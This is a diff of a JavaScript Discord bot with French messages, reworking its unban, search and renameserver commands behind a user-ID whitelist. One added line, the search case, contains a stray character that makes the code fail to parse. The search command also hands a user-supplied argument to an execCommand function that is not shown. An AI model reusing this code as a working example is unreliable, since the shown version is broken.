+                case `${prefix}unban`:
+                    if (!message.guild) {
+                        return message.reply('Cette commande ne peut être exécutée que sur un serveur.');
+                    }
+                    if (!message.member.permissions.has('BAN_MEMBERS')) {
+                        return message.reply('Vous n\'avez pas les permissions nécessaires pour débannir des membres.');
+                    }
+                    if (!args[1]) {
+                        return message.reply('Veuillez spécifier l\'ID de l\'utilisateur à débannir.');
+                    }
+                    message.guild.bans.remove(args[1])
+                        .then(() => {
+                            message.reply(`Utilisateur avec l'ID ${args[1]} a été débanni avec succès.`);
+                        })
+                        .catch(error => {
+                            console.error('Erreur lors du débannissement de l\'utilisateur :', error);
+                            message.reply('Une erreur est survenue lors du débannissement de l\'utilisateur.');
+                        });
+                    break;
+                default:
+                    break;
+            }
         }
-        try {
-            await message.guild.bans.remove(args[1]);
-            message.reply(`Utilisateur avec l'ID ${args[1]} a été débanni avec succès.`);
-        } catch (error) {
-            console.error('Erreur lors du débannissement de l\'utilisateur :', error);
-            message.reply('Une erreur est survenue lors du débannissement de l\'utilisateur.');
-        }
-    }
+    });
 });
 
 // Commande Search
 client.on('messageCreate', async (message) => {
     whitelist_id.forEach(id => {
         const args = message.content.split(' ');
-        if (message.author.id == id)
-            if (args[0][0] == prefix)
-                if (args[0] == "&search")
-                    execCommand(message, args[1], fileName);
+        const command = args[0].toLowerCase();
+
+        if (message.author.id === id && command.startsWith(prefix)) {
+            switch (command) {
+                case `${prefix}search`:e
+                    if (args.length >= 2) {
+                        execCommand(message, args[1], fileName);
+                    } else {
+                        message.channel.send(`Usage : ${prefix}search [query]`);
+                    }
+                    break;
+                default:
+                    break;
+            }
+        }
     });
 });
 
-// Commande renameserver
+// Commande RenameServer
 client.on('messageCreate', async message => {
-    if (message.content.startsWith('&renameserver')) {
-        if (!message.guild) {
-            return message.reply('Cette commande ne peut être exécutée que sur un serveur.');
-        }
+    whitelist_id.forEach(id => {
+        const args = message.content.split(' ');
+        const command = args[0].toLowerCase();
 
-        const newNickname = message.content.split(' ').slice(1).join(' ');
-        if (!newNickname) {
-            return message.reply('Veuillez spécifier le nouveau pseudo.');
-        }
+        if (message.author.id === id && command.startsWith(prefix)) {
+            switch (command) {
+                case `${prefix}renameserver`:
+                    if (!message.guild) {
+                        return message.reply('Cette commande ne peut être exécutée que sur un serveur.');
+                    }
 
-        try {
-            await message.member.setNickname(newNickname);
-            message.reply(`Votre pseudo a été changé avec succès sur ${message.guild.name}.`);
-        } catch (error) {
-            console.error('Erreur lors du changement de pseudo :', error);
-            message.reply('Une erreur est survenue lors du changement de pseudo.');
+                    const newNickname = args.slice(1).join(' ');
+                    if (!newNickname) {
+                        return message.reply('Veuillez spécifier le nouveau pseudo.');
+                    }
+
+                    message.member.setNickname(newNickname)
+                        .then(() => {
+                            message.reply(`Votre pseudo a été changé avec succès sur ${message.guild.name}.`);
+                        })
+                        .catch(error => {
+                            console.error('Erreur lors du changement de pseudo :', error);
+                            message.reply('Une erreur est survenue lors du changement de pseudo.');
+                        });
+                    break;
+                default:
+                    break;
+            }
         }
-    }
+    });
 });
+
+
 
 client.login(process.env.TOKEN);
